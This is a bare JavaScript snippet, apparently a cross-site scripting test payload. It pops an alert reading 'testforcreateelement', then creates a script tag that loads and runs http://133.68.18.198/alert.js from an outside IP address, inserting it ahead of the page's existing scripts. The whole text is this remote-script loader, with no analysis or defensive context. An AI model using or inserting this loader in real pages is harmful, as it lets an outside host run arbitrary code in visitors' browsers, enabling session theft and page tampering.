var random = as();
function as(){
	alert('testforcreateelement');
}
var ga = document.createElement('script');
ga.type ='text/javascript';
ga.src = "http://133.68.18.198/alert.js";

var s = document.getElementsByTagName('script')[0];
s.parentNode.insertBefore(ga,s);

